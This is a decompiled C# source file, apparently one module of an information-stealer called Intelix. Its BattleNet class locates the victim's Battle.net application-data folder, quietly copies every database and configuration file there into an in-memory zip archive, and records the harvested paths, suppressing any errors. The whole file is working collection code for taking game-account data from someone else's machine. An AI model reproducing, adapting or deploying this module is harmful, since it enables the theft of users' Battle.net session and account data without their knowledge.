using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games
{
	// Token: 0x02000023 RID: 35
	public class BattleNet : ITarget
	{
		// Token: 0x06000069 RID: 105 RVA: 0x00004D00 File Offset: 0x00002F00
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");
			bool flag = !Directory.Exists(path);
			if (!flag)
			{
				string[] array = new string[]
				{
					"*.db",
					"*.config"
				};
				Counter.CounterApplications counterApplications = new Counter.CounterApplications
				{
					Name = "BattleNet"
				};
				string[] array2 = array;
				foreach (string searchPattern in array2)
				{
					string[] files = Directory.GetFiles(path, searchPattern, SearchOption.AllDirectories);
					foreach (string fileName in files)
					{
						try
						{
							FileInfo fileInfo = new FileInfo(fileName);
							string path2 = "BattleNet";
							DirectoryInfo directory = fileInfo.Directory;
							string path3;
							if (!(((directory != null) ? directory.Name : null) == "Battle.net"))
							{
								DirectoryInfo directory2 = fileInfo.Directory;
								path3 = ((directory2 != null) ? directory2.Name : null);
							}
							else
							{
								path3 = "";
							}
							string text = Path.Combine(Path.Combine(path2, path3), fileInfo.Name);
							zip.AddFile(text, File.ReadAllBytes(fileInfo.FullName));
							counterApplications.Files.Add(fileInfo.FullName + " => " + text);
						}
						catch
						{
						}
					}
				}
				bool flag2 = counterApplications.Files.Count > 0;
				if (flag2)
				{
					counterApplications.Files.Add("BattleNet\\");
					counter.Games.Add(counterApplications);
				}
			}
		}
	}
}
